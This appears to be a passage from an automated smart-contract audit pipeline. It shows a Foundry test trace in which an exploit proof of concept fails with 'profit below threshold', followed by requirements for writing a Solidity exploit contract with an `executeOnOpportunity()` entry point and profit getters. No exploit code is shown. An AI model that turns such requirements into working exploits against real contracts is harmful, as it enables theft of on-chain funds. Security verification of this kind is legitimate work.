    │   ├─ [2620] 0x3335A88bb18fD3b6824b59Af62b50CE494143333::maxTokenAmount(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [371] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [392] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 55.02ms (3.26ms CPU time)

Ran 1 test suite in 113.60ms (55.02ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 324041)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
